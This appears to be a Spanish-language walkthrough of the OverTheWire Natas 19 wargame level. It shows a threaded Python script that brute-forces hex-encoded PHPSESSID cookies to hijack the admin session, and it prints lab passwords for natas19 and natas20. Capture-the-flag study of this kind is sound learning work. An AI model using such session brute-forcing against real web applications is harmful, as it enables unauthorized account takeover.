# Natas 19

### URL:

### Credenciales: natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr

Introducimos user:user y nuestra cookie de sesion luce como hexadecimal, si la decodificamos vemos algo similar a esto:

``` bash
python3
Python 3.12.8 (main, Dec  4 2024, 12:15:27) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import binascii;binascii.unhexlify("3539372d75736572")
b'597-user'
```

Nuestra cookie guarda en formato hexadecimal una cadena de la forma "ID-username". Nos mencionan que ya el orden de los id's no es secuencial, pero sabemos que el usuario es admin.

Hacemos el mismo proceso que en el nivel anterior, solo que ahora concatenamos la ID a "-admin" y la codificamos en hexadecimal antes

``` python
from base64 import b64encode
import requests
import threading

URL="http://natas19.natas.labs.overthewire.org/index.php"
threads = []
output = None

def tryID(n):
        global output
        headers = {'Authorization': f'Basic {b64encode('natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr'.encode()).decode()}',
               'Content-Type': 'application/x-www-form-urlencoded',
               'Cookie': "PHPSESSID=" + f"{n}-admin".encode().hex()}
        data = "username=admin&password=admin"
        print(headers['Cookie'])

        x = requests.post(URL,headers=headers,data=data)
        if "You are logged in as a regular user." not in x.text:
            output=x.text + "#### Admin cookie: " + headers['Cookie']

for i in range(0,20):
    for j in range(0,50):
        print(i*50+j)
        t = threading.Thread(target=tryID,args=(i*50+j,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    if output:
        print(output)
        break
    threads.clear()
```

Si ejecutamos este script con `python3 script.py` obtenemos al final
```
You are an admin. The credentials for the next level are:<br><pre>Username: natas20
Password: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw</pre></div>
</body>
</html>
#### Admin cookie: PHPSESSID=3238312d61646d696e
```

`natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw`

PD: Esta vez ajusté los hilos a 50 

